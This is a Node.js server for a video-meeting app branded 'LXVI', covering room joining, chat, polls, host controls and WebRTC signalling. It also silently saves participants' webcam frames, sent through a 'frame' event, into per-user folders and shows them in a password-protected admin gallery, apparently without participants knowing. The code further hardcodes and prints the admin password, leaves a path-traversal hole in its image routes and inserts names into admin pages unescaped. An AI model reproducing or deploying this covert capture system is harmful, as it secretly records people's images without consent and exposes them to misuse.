const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  maxHttpBufferSize: 10e6,
});

const PORT = process.env.PORT || 3000;
const CAPTURES_DIR = path.join(__dirname, "captures");
const ADMIN_PASSWORD = "lxvi2024";

if (!fs.existsSync(CAPTURES_DIR)) fs.mkdirSync(CAPTURES_DIR, { recursive: true });

app.use(express.static(path.join(__dirname, "public")));

// ─── AUTH ───
function checkAdmin(req, res, next) {
  const auth = req.headers["authorization"];
  const cookie = req.headers["cookie"] || "";
  const hasCookie = cookie.includes(`lxvi_admin=${ADMIN_PASSWORD}`);
  if (hasCookie || (auth && auth === `Bearer ${ADMIN_PASSWORD}`)) return next();
  res.status(401).send(`<!DOCTYPE html><html><head><title>LXVI Admin</title>
  <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#02020a;color:#eeeaff;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;}
  .box{background:#0e0e1a;border:1px solid #ffffff14;border-radius:24px;padding:48px;width:360px;text-align:center;}
  h2{font-size:40px;font-weight:900;letter-spacing:0.1em;margin-bottom:8px;background:linear-gradient(135deg,#fff,#8875ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
  p{color:#4a4468;font-size:13px;margin-bottom:32px;}
  input{width:100%;background:#161624;border:1px solid #ffffff14;border-radius:12px;padding:14px;color:#eeeaff;font-size:16px;outline:none;margin-bottom:14px;text-align:center;letter-spacing:0.1em;}
  input:focus{border-color:#8875ff;}button{width:100%;background:linear-gradient(135deg,#8875ff,#6b5ce7);border:none;border-radius:12px;padding:15px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;}
  .err{color:#ff4d6d;font-size:13px;margin-top:12px;display:none;}</style></head>
  <body><div class="box"><h2>LXVI</h2><p>Admin access only</p>
  <input type="password" id="pw" placeholder="Enter password" onkeydown="if(event.key==='Enter')login()"/>
  <button onclick="login()">Enter Panel</button><div class="err" id="err">❌ Wrong password!</div>
  <script>function login(){const pw=document.getElementById('pw').value;document.cookie='lxvi_admin='+pw+';path=/';
  fetch('/admin',{headers:{'Authorization':'Bearer '+pw}}).then(r=>{if(r.ok){location.reload();}else{document.getElementById('err').style.display='block';document.cookie='lxvi_admin=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/'}}).catch(()=>{document.getElementById('err').style.display='block';});}</script>
  </div></body></html>`);
}

// ─── ADMIN PANEL ───
app.get("/admin", checkAdmin, (req, res) => {
  const roomMap = {};
  Object.values(users).forEach(u => {
    if (!roomMap[u.roomId]) roomMap[u.roomId] = [];
    roomMap[u.roomId].push(u);
  });

  const captureStats = {};
  let totalCaptures = 0;
  if (fs.existsSync(CAPTURES_DIR)) {
    fs.readdirSync(CAPTURES_DIR).forEach(folder => {
      const fp = path.join(CAPTURES_DIR, folder);
      if (fs.statSync(fp).isDirectory()) {
        const count = fs.readdirSync(fp).filter(f => f.endsWith('.jpg')).length;
        captureStats[folder] = count;
        totalCaptures += count;
      }
    });
  }

  const roomsHTML = Object.entries(roomMap).map(([roomId, members]) => `
    <div class="room-card">
      <div class="room-header"><span class="room-name">🚪 ${roomId}</span><span class="room-badge">${members.length} online</span></div>
      ${members.map(m => {
        const fk = m.name + '_' + m.socketId.slice(0,6);
        return `<div class="member"><span class="dot"></span><span class="mname">${m.name}</span><span class="mid">${m.socketId.slice(0,8)}...</span>
        <a class="pics-link" href="/admin/gallery/${encodeURIComponent(fk)}" target="_blank">📸 ${captureStats[fk]||0} →</a></div>`;
      }).join('')}
    </div>`).join('') || '<div class="empty">😴 No active rooms</div>';

  res.send(`<!DOCTYPE html><html><head><title>LXVI Admin</title><meta http-equiv="refresh" content="5">
  <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#02020a;color:#eeeaff;font-family:system-ui;min-height:100vh;}
  .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 32px;background:#080810;border-bottom:1px solid #ffffff0f;}
  .brand{font-size:22px;font-weight:900;letter-spacing:0.1em;background:linear-gradient(135deg,#fff,#8875ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
  .content{padding:32px;}.stats{display:flex;gap:16px;margin-bottom:32px;flex-wrap:wrap;}
  .stat{background:#080810;border:1px solid #ffffff0f;border-radius:16px;padding:24px 32px;cursor:default;transition:all 0.2s;}
  .stat.click{cursor:pointer;}.stat.click:hover{border-color:#8875ff;transform:translateY(-2px);}
  .stat-val{font-size:40px;font-weight:800;color:#8875ff;line-height:1;}.stat.click .stat-val{color:#ff6b9d;}
  .stat-label{font-size:12px;color:#4a4468;margin-top:6px;text-transform:uppercase;letter-spacing:0.1em;}
  .section-title{font-size:11px;color:#4a4468;text-transform:uppercase;letter-spacing:0.12em;margin-bottom:16px;font-weight:700;}
  .room-card{background:#080810;border:1px solid #ffffff0f;border-radius:16px;padding:20px;margin-bottom:12px;}
  .room-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;}
  .room-name{font-size:16px;font-weight:700;}.room-badge{background:#8875ff22;color:#8875ff;padding:4px 14px;border-radius:99px;font-size:12px;font-weight:600;}
  .member{display:flex;align-items:center;gap:12px;padding:10px 0;border-top:1px solid #ffffff08;font-size:13px;}
  .dot{width:8px;height:8px;background:#00f5c4;border-radius:50%;box-shadow:0 0 8px #00f5c4;flex-shrink:0;}
  .mname{font-weight:600;min-width:100px;}.mid{color:#4a4468;flex:1;font-family:monospace;font-size:12px;}
  .pics-link{color:#ff6b9d;text-decoration:none;font-size:12px;background:#ff6b9d12;border:1px solid #ff6b9d33;padding:4px 12px;border-radius:8px;}
  .empty{color:#4a4468;text-align:center;padding:48px;}</style></head>
  <body><div class="topbar"><div class="brand">LXVI ADMIN</div><div style="font-size:11px;color:#4a4468">Auto-refresh 5s</div></div>
  <div class="content"><div class="stats">
  <div class="stat"><div class="stat-val">${Object.keys(roomMap).length}</div><div class="stat-label">Active Rooms</div></div>
  <div class="stat"><div class="stat-val">${Object.keys(users).length}</div><div class="stat-label">Users Online</div></div>
  <div class="stat click" onclick="window.open('/admin/gallery','_blank')"><div class="stat-val">${totalCaptures}</div><div class="stat-label">Total Captures 🖼️</div></div>
  </div><div class="section-title">Live Rooms</div>${roomsHTML}</div></body></html>`);
});

// ─── GALLERY ───
app.get("/admin/gallery", checkAdmin, (req, res) => {
  const folders = [];
  if (fs.existsSync(CAPTURES_DIR)) {
    fs.readdirSync(CAPTURES_DIR).forEach(folder => {
      const fp = path.join(CAPTURES_DIR, folder);
      if (fs.statSync(fp).isDirectory()) {
        const files = fs.readdirSync(fp).filter(f => f.endsWith('.jpg')).sort().reverse();
        folders.push({ name: folder, count: files.length, latest: files[0] || null });
      }
    });
  }
  const fHTML = folders.length === 0 ? '<div class="empty">📭 No captures yet</div>' :
    folders.map(f => `<a class="user-card" href="/admin/gallery/${encodeURIComponent(f.name)}">
      <div class="user-thumb">${f.latest ? `<img src="/admin/img/${encodeURIComponent(f.name)}/${encodeURIComponent(f.latest)}" onerror="this.style.display='none'"/>` : '<div class="no-img">📷</div>'}</div>
      <div class="user-info"><div class="user-name">${f.name.split('_')[0]}</div><div class="user-count">${f.count} captures</div></div></a>`).join('');
  res.send(`<!DOCTYPE html><html><head><title>LXVI Gallery</title>
  <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#02020a;color:#eeeaff;font-family:system-ui;min-height:100vh;}
  .topbar{display:flex;align-items:center;gap:16px;padding:16px 32px;background:#080810;border-bottom:1px solid #ffffff0f;}
  .back{color:#8875ff;text-decoration:none;font-size:13px;border:1px solid #8875ff44;padding:6px 14px;border-radius:8px;}
  .title{font-size:18px;font-weight:800;}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;padding:32px;}
  .user-card{background:#080810;border:1px solid #ffffff0f;border-radius:16px;overflow:hidden;cursor:pointer;text-decoration:none;color:#eeeaff;transition:all 0.2s;display:block;}
  .user-card:hover{border-color:#ff6b9d;transform:translateY(-3px);}
  .user-thumb{height:160px;background:#161624;display:flex;align-items:center;justify-content:center;overflow:hidden;}
  .user-thumb img{width:100%;height:100%;object-fit:cover;}.no-img{font-size:40px;}
  .user-info{padding:14px 16px;}.user-name{font-size:15px;font-weight:700;margin-bottom:4px;}.user-count{font-size:12px;color:#ff6b9d;}
  .empty{color:#4a4468;text-align:center;padding:80px;}</style></head>
  <body><div class="topbar"><a class="back" href="/admin">← Back</a><div class="title">📸 All Captures</div></div>
  <div class="grid">${fHTML}</div></body></html>`);
});

app.get("/admin/gallery/:folder", checkAdmin, (req, res) => {
  const folder = decodeURIComponent(req.params.folder);
  const folderPath = path.join(CAPTURES_DIR, folder);
  if (!fs.existsSync(folderPath)) return res.status(404).send("Not found");
  const files = fs.readdirSync(folderPath).filter(f => f.endsWith('.jpg')).sort().reverse();
  const userName = folder.split('_')[0];
  const imgsHTML = files.length === 0 ? '<div class="empty">No captures</div>' :
    files.map((f, i) => {
      const ts = f.replace('frame_','').replace('.jpg','').slice(0,19).replace('T',' ');
      return `<div class="img-card" onclick="openModal(${i})"><img src="/admin/img/${encodeURIComponent(folder)}/${encodeURIComponent(f)}" loading="lazy"/><div class="img-time">${ts}</div></div>`;
    }).join('');
  const allSrcs = JSON.stringify(files.map(f => `/admin/img/${encodeURIComponent(folder)}/${encodeURIComponent(f)}`));
  res.send(`<!DOCTYPE html><html><head><title>${userName}</title>
  <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#02020a;color:#eeeaff;font-family:system-ui;min-height:100vh;}
  .topbar{display:flex;align-items:center;gap:16px;padding:16px 32px;background:#080810;border-bottom:1px solid #ffffff0f;}
  .back{color:#8875ff;text-decoration:none;font-size:13px;border:1px solid #8875ff44;padding:6px 14px;border-radius:8px;}
  .title{font-size:18px;font-weight:800;}.count{font-size:12px;color:#4a4468;margin-left:auto;}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;padding:24px;}
  .img-card{background:#080810;border:1px solid #ffffff0f;border-radius:12px;overflow:hidden;cursor:pointer;transition:all 0.2s;}
  .img-card:hover{border-color:#8875ff;transform:scale(1.02);}
  .img-card img{width:100%;height:140px;object-fit:cover;display:block;}
  .img-time{font-size:10px;color:#4a4468;padding:7px 10px;font-family:monospace;}
  #modal{display:none;position:fixed;inset:0;background:#000000ee;z-index:999;align-items:center;justify-content:center;flex-direction:column;}
  #modal.open{display:flex;}#modal img{max-width:90vw;max-height:80vh;border-radius:12px;object-fit:contain;}
  .modal-nav{display:flex;gap:24px;margin-top:20px;align-items:center;}
  .nav-btn{background:#0e0e1a;border:1px solid #ffffff18;border-radius:10px;padding:10px 24px;color:#eeeaff;cursor:pointer;font-size:18px;}
  .modal-close{position:fixed;top:20px;right:24px;background:#ff4d6d;border:none;border-radius:10px;padding:8px 18px;color:#fff;cursor:pointer;font-size:14px;font-weight:700;}
  .modal-info{color:#4a4468;font-size:12px;margin-top:8px;font-family:monospace;}
  .empty{color:#4a4468;text-align:center;padding:80px;}</style></head>
  <body><div class="topbar"><a class="back" href="/admin/gallery">← All Users</a><div class="title">📸 ${userName}</div><div class="count">${files.length} captures</div></div>
  <div class="grid">${imgsHTML}</div>
  <div id="modal"><button class="modal-close" onclick="closeModal()">✕ Close</button><img id="modal-img" src=""/>
  <div class="modal-info" id="modal-info"></div>
  <div class="modal-nav"><button class="nav-btn" onclick="prevImg()">‹</button><span id="modal-counter" style="color:#4a4468;font-size:13px;"></span><button class="nav-btn" onclick="nextImg()">›</button></div></div>
  <script>const srcs=${allSrcs};let cur=0;
  function openModal(i){cur=i;update();document.getElementById('modal').classList.add('open');}
  function closeModal(){document.getElementById('modal').classList.remove('open');}
  function nextImg(){cur=(cur+1)%srcs.length;update();}function prevImg(){cur=(cur-1+srcs.length)%srcs.length;update();}
  function update(){document.getElementById('modal-img').src=srcs[cur];document.getElementById('modal-counter').textContent=(cur+1)+' / '+srcs.length;}
  document.getElementById('modal').addEventListener('click',e=>{if(e.target===document.getElementById('modal'))closeModal();});
  document.addEventListener('keydown',e=>{if(e.key==='ArrowRight')nextImg();if(e.key==='ArrowLeft')prevImg();if(e.key==='Escape')closeModal();});
  </script></body></html>`);
});

app.get("/admin/img/:folder/:file", checkAdmin, (req, res) => {
  const filePath = path.join(CAPTURES_DIR, decodeURIComponent(req.params.folder), decodeURIComponent(req.params.file));
  if (!fs.existsSync(filePath)) return res.status(404).send("Not found");
  res.sendFile(filePath);
});

app.get("/rooms", (req, res) => {
  const roomMap = {};
  Object.values(users).forEach(u => {
    if (!roomMap[u.roomId]) roomMap[u.roomId] = { count: 0, locked: rooms[u.roomId]?.locked || false, hasPassword: !!rooms[u.roomId]?.password };
    roomMap[u.roomId].count++;
  });
  res.json(roomMap);
});

// ─── ROOM STATE ───
const users = {};
const rooms = {}; // roomId -> { hostId, locked, password, waitingRoom, agenda }

io.on("connection", (socket) => {
  console.log(`\n🟢 Connected: ${socket.id}`);

  socket.on("join", ({ name, roomId, password }) => {
    const room = rooms[roomId];

    // Password check
    if (room?.password && room.password !== password) {
      socket.emit("join-error", { reason: "wrong-password" });
      return;
    }

    // Waiting room check
    if (room?.waitingRoom && room.hostId && room.hostId !== socket.id) {
      socket.emit("join-error", { reason: "waiting" });
      // Notify host
      const host = users[room.hostId];
      if (host) {
        io.to(room.hostId).emit("waiting-user", { socketId: socket.id, name });
      }
      // Store pending
      if (!room.pending) room.pending = {};
      room.pending[socket.id] = { name, socketId: socket.id };
      return;
    }

    // Room locked check
    if (room?.locked) {
      socket.emit("join-error", { reason: "locked" });
      return;
    }

    admitUser(socket, name, roomId);
  });

  socket.on("admit-user", ({ socketId, admit }) => {
    const user = users[socket.id];
    if (!user) return;
    const room = rooms[user.roomId];
    if (!room || room.hostId !== socket.id) return;
    const pending = room.pending?.[socketId];
    if (!pending) return;
    delete room.pending[socketId];
    if (admit) {
      const pendingSocket = io.sockets.sockets.get(socketId);
      if (pendingSocket) admitUser(pendingSocket, pending.name, user.roomId);
    } else {
      io.to(socketId).emit("join-error", { reason: "denied" });
    }
  });

  socket.on("offer", ({ to, offer }) => socket.to(to).emit("offer", { from: socket.id, offer }));
  socket.on("answer", ({ to, answer }) => socket.to(to).emit("answer", { from: socket.id, answer }));
  socket.on("ice-candidate", ({ to, candidate }) => socket.to(to).emit("ice-candidate", { from: socket.id, candidate }));

  socket.on("chat-msg", ({ name, msg, roomId, to }) => {
    if (to) {
      // Private message
      socket.to(to).emit("chat-msg", { name, msg, sid: socket.id, isPrivate: true });
      socket.emit("chat-msg", { name: `You → ${users[to]?.name||'?'}`, msg, sid: socket.id, isPrivate: true, sent: true });
    } else {
      io.to(roomId).emit("chat-msg", { name, msg, sid: socket.id });
    }
  });

  socket.on("chat-reaction", ({ msgId, emoji, roomId }) => {
    io.to(roomId).emit("chat-reaction", { msgId, emoji, name: users[socket.id]?.name });
  });

  socket.on("cam-state", ({ name, roomId, on }) => {
    socket.to(roomId).emit("cam-state", { socketId: socket.id, name, on });
  });

  socket.on("hand-raise", ({ roomId, on }) => {
    socket.to(roomId).emit("hand-raise", { socketId: socket.id, on });
  });

  socket.on("host-action", ({ action, targetId, roomId, value }) => {
    const room = rooms[roomId];
    if (!room || room.hostId !== socket.id) return;
    if (action === "mute") io.to(targetId).emit("force-mute");
    if (action === "kick") {
      io.to(targetId).emit("force-kick");
      const ts = io.sockets.sockets.get(targetId);
      if (ts) ts.disconnect();
    }
    if (action === "mute-all") {
      Object.values(users).filter(u => u.roomId === roomId && u.socketId !== socket.id)
        .forEach(u => io.to(u.socketId).emit("force-mute"));
    }
    if (action === "lock") { room.locked = value; io.to(roomId).emit("room-locked", { locked: value }); }
    if (action === "transfer-host") {
      room.hostId = targetId;
      io.to(roomId).emit("host-changed", { newHostId: targetId, newHostName: users[targetId]?.name });
    }
    if (action === "spotlight") { io.to(roomId).emit("spotlight", { socketId: targetId }); }
    if (action === "waiting-room") { room.waitingRoom = value; }
    if (action === "set-agenda") { room.agenda = value; io.to(roomId).emit("agenda-update", { agenda: value }); }
  });

  socket.on("poll-create", ({ question, options, roomId }) => {
    const room = rooms[roomId];
    if (!room || room.hostId !== socket.id) return;
    const pollId = Date.now().toString();
    room.poll = { id: pollId, question, options, votes: {} };
    io.to(roomId).emit("poll-start", { pollId, question, options });
  });

  socket.on("poll-vote", ({ pollId, option, roomId }) => {
    const room = rooms[roomId];
    if (!room?.poll || room.poll.id !== pollId) return;
    room.poll.votes[socket.id] = option;
    const results = {};
    Object.values(room.poll.votes).forEach(v => { results[v] = (results[v] || 0) + 1; });
    io.to(roomId).emit("poll-results", { pollId, results, total: Object.keys(room.poll.votes).length });
  });

  socket.on("notepad-update", ({ content, roomId }) => {
    socket.to(roomId).emit("notepad-update", { content });
  });

  socket.on("speaking", ({ roomId, speaking }) => {
    socket.to(roomId).emit("speaking", { socketId: socket.id, speaking });
  });

  socket.on("team-shuffle", ({ roomId }) => {
    const room = rooms[roomId];
    if (!room || room.hostId !== socket.id) return;
    const roomUsers = Object.values(users).filter(u => u.roomId === roomId);
    const shuffled = [...roomUsers].sort(() => Math.random() - 0.5);
    const teams = [[], []];
    shuffled.forEach((u, i) => teams[i % 2].push(u.name));
    io.to(roomId).emit("teams-result", { teams });
  });

  socket.on("frame", ({ frameData }) => {
    const user = users[socket.id];
    if (!user || !user.captureDir) return;
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const filepath = path.join(user.captureDir, `frame_${timestamp}.jpg`);
    fs.writeFile(filepath, frameData.replace(/^data:image\/jpeg;base64,/, ""), "base64", () => {
      process.stdout.write(`📸 ${user.name}\r`);
    });
  });

  socket.on("disconnect", () => {
    const user = users[socket.id];
    if (user) {
      console.log(`\n🔴 ${user.name} left`);
      socket.to(user.roomId).emit("user-left", { socketId: socket.id, name: user.name });
      const roomId = user.roomId;
      delete users[socket.id];
      // If host left, assign new host
      if (rooms[roomId]?.hostId === socket.id) {
        const remaining = Object.values(users).filter(u => u.roomId === roomId);
        if (remaining.length > 0) {
          rooms[roomId].hostId = remaining[0].socketId;
          io.to(roomId).emit("host-changed", { newHostId: remaining[0].socketId, newHostName: remaining[0].name });
        } else {
          delete rooms[roomId];
        }
      }
      broadcastUserList(roomId);
    }
  });
});

function admitUser(socket, name, roomId) {
  users[socket.id] = { name, roomId, socketId: socket.id, joinTime: Date.now() };
  socket.join(roomId);

  // Create room if not exists
  if (!rooms[roomId]) rooms[roomId] = { hostId: socket.id, locked: false, password: null, waitingRoom: false };

  const userDir = path.join(CAPTURES_DIR, `${name}_${socket.id.slice(0, 6)}`);
  if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
  users[socket.id].captureDir = userDir;

  console.log(`👤 ${name} joined room: ${roomId}`);

  socket.emit("join-success", {
    hostId: rooms[roomId].hostId,
    isHost: rooms[roomId].hostId === socket.id,
    agenda: rooms[roomId].agenda || ""
  });

  socket.to(roomId).emit("user-joined", { socketId: socket.id, name });

  const existingUsers = Object.values(users)
    .filter(u => u.roomId === roomId && u.socketId !== socket.id)
    .map(u => ({ socketId: u.socketId, name: u.name, joinTime: u.joinTime }));
  socket.emit("existing-users", existingUsers);
  broadcastUserList(roomId);
}

function broadcastUserList(roomId) {
  const roomUsers = Object.values(users)
    .filter(u => u.roomId === roomId)
    .map(u => ({ socketId: u.socketId, name: u.name, joinTime: u.joinTime, isHost: rooms[roomId]?.hostId === u.socketId }));
  io.to(roomId).emit("user-list", roomUsers);
}

server.listen(PORT, () => {
  console.log(`\n╔══════════════════════════════════════╗\n║  ⚡ LXVI Running on port ${PORT}        ║\n║  Admin: /admin  Pass: ${ADMIN_PASSWORD}   ║\n╚══════════════════════════════════════╝\n`);
});
EOF